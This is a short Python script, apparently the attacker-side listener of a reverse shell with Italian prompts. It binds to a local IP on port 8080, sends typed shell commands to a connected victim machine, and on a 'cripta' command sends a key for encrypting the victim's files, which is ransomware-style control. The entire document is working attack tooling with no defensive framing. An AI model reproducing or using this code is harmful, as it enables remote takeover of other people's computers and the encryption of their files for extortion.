#Author: Antonino Fortunato 
#email: antoninofortunato.pc@gmail.com 

import socket 
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(("192.168.137.1", 8080)) # indirizzo ip server
s.listen(1) 

print ('[+] Connessione in attesa sulla porta: 8080')

conn, addr = s.accept() 

print ('[+] Connessione stabilita: '), 

while True:

      command = input("Shell> ")
      conn.send(command.encode())

      if 'cripta' in command:

          key_value=input("Inserisci chiave per criptare i files: ")
          conn.send(key_value.encode())
          break
                  
      if 'terminate' in command: 
            conn.send(command.encode())
            conn.close()
            break

     